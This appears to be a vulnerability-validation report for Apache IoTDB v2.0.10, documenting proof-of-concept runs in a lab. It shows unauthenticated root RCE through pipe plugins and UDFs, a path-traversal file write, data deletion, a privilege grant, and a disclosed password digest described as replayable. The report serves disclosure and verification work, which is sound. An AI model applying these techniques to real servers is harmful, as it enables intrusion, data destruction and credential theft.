# Apache IoTDB v2.0.10 — validation evidence

- Generated: `2026-08-15T03:22:23Z` (UTC)
- Image: `apache/iotdb:2.0.10-standalone` (release commit 3c26382bebee73ec1c9593f836ef4cdcc0376062)
- Harness: `pocs/run-all.sh` — before/after state is read from the server's OWN CLI, not asserted by the PoC.


---

## F-07 — Unauthenticated connection/username disclosure (port 6667)
A separate root session is held open; the unauthenticated caller enumerates it:
```
[F-07] 2026-08-15T03:24:56Z  target=iotdb-lab:6667  (no openSession, no credentials)
[F-07] fetchAllConnectionsInfo        -> 1 connection record(s), UNAUTHENTICATED:
[F-07]   user=root type=THRIFT_BASED connectionId=192.168.32.2:57180 logInTime=1786764293377
[F-07] 2026-08-15T03:24:56Z  Any record above was disclosed with no authentication.
```

---

## F-02 — Pre-auth arbitrary-directory file write as root (port 6667)
BEFORE — target file absent:
```
(absent)
```
PoC (no credentials):
```
[F-02] 2026-08-15T03:25:07Z  target=iotdb-lab:6667  (no openSession, no credentials)
[F-02] legacy handshake (no creds)    -> code=200
[F-02] sendFile fileName=../../../../../../../tmp/RAPTOR_F02_PROOF -> code=200
[F-02] 2026-08-15T03:25:07Z  If code=200, a root-owned <fileName>.patch was written OUTSIDE the sync receiver dir.
```
AFTER — file written OUTSIDE the sync dir, owned by the server user:
```
-rw-r--r-- 1 root root 61 Aug 15 03:25 /tmp/RAPTOR_F02_PROOF.patch
RAPTOR_LEGACY_PIPE_ARBITRARY_FILE_WRITE 2026-08-15T03:25:07Z
```

---

## F-05 — Unauthenticated data destruction as root (port 6667)
BEFORE — row count (via server CLI, as root):
```
+--------------------+
|count(root.demo.d.s)|
+--------------------+
|                  41|
+--------------------+
Total line number = 1
It costs 0.061s
```
PoC (no credentials):
```
[F-05] 2026-08-15T03:25:30Z  target=iotdb-lab:6667 path=root.demo.d.s  (no openSession, no credentials)
[F-05] legacy handshake (no creds)    -> code=200
[F-05] sendPipeData (DeletionPipeData) -> code=200
[F-05] 2026-08-15T03:25:30Z  If code=200, all data under root.demo.d.s was deleted as SUPER_USER (verify count before/after).
```
AFTER — row count (via server CLI, as root):
```
+----+
|Time|
+----+
+----+
Empty set.
It costs 0.014s
```

---

## F-01 — Unauthenticated RCE as root via the pipe config-plane (port 6667)
_Unauthenticated tier requires root's password to still be the default 'root'._
BEFORE — execution marker absent:
```
(absent)
```
PoC (no credentials):
```
[F-01] 2026-08-15T03:25:33Z  target=iotdb-lab:6667  (no openSession, no credentials)
[F-01] handshake (zero credentials)   -> code=200
[F-01] CreatePipePlugin (inline JAR)  -> code=200
[F-01] 2026-08-15T03:25:33Z  If code=200, the plugin class static initializer ran on the server (see /tmp marker + server log).
```
AFTER — command executed in the server process (marker written by the plugin static initializer):
```
RAPTOR_PIPEPLUGIN_RCE uid=0(root) gid=0(root) groups=0(root) iotdb-lab 2026-08-15T03:25:33Z
```
The marker's `uid=0(root)` line is the malicious plugin's static initializer running `id` inside the server process.

---

## F-04 — Unauthenticated RCE as root via DataNode internal RPC (port 10730)
_Conditional on reachability of port 10730 (exposed here via the internal overlay)._
BEFORE — execution marker absent:
```
(absent)
```
PoC (no session, no credentials):
```
[F-04] 2026-08-15T03:25:37Z  target=iotdb-lab:10730  (raw Thrift, NO session, NO credentials)
[F-04] createFunction(validationudf1786764337)        -> code=200
[F-04] 2026-08-15T03:25:37Z  If code=200, the UDF class static initializer ran on the server (see /tmp marker + server log).
```
AFTER — command executed in the server process (marker written by the UDF static initializer):
```
RAPTOR_RCE uid=0(root) gid=0(root) groups=0(root) iotdb-lab 2026-08-15T03:25:37Z
```

---

## F-09 — Unauthenticated privilege grant + digest disclosure via ConfigNode RPC (port 10710)
_Conditional on reachability of port 10710 (exposed here via the internal overlay)._
BEFORE — privileges of validationlow (via server CLI, as root):
```
+----+-----+----------+-----------+
|Role|Scope|Privileges|GrantOption|
+----+-----+----------+-----------+
+----+-----+----------+-----------+
Empty set.
It costs 0.017s
```
PoC (no session, no credentials):
```
[F-09] 2026-08-15T03:25:43Z  target=iotdb-lab:10710  (raw Thrift, NO session, NO credentials)
[F-09] operatePermission GRANT_USER(MANAGE_ROLE -> validationlow) -> code=200 msg=Executed successfully.
[F-09] getUser('root')                -> code=200
[F-09]   root permission set + password digest disclosed unauthenticated:
[F-09]   name=root sysPriSet=[20, 21, 22]
[F-09]   password_digest(hex)=4813494d137e16313f3f013f3f6e7b3f3f743f113f3f56565e3f1d7376773f   <- replayable via the encrypted-password login mode (pass-the-hash, see F-14)
[F-09] 2026-08-15T03:25:43Z  If grant code=200, verify with `LIST PRIVILEGES OF USER validationlow` (run-all.sh does this).
```
AFTER — validationlow now holds MANAGE_ROLE, granted with no authentication:
```
+----+-----+-----------+-----------+
|Role|Scope| Privileges|GrantOption|
+----+-----+-----------+-----------+
|    |     |MANAGE_ROLE|      false|
+----+-----+-----------+-----------+
Total line number = 1
It costs 0.011s
```

---

## Environment
```
openjdk version "17.0.15" 2025-04-15
uid=0(root) gid=0(root) groups=0(root)
iotdb image digest: apache/iotdb@sha256:014c15f1c7154a2910bae205ae415c38883d26b686c55eca1b4887fe7c4f8110
```
